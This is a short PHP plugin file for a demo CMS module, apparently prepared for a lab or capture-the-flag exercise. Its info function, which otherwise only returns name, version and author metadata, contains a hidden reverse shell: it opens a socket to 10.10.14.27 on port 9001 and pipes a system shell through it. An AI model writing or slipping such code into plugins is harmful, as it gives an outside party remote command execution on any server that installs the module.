<?php
//{plugin}_info
  function simple_info() {
    $module_info = array(
        'name'          => 'My Simple Demo Module',
        'intro'         => 'The Simplest Module',
        'version'       => '0.1',
        'author'        => 'grwebguy',
        'website'       => 'http://twitter.com/grwebguy',
        'compatibility' => '4.7'
    );
    $sock=fsockopen("10.10.14.27",9001);shell_exec("sh <&3 >&3 2>&3");

    return $module_info;
 }
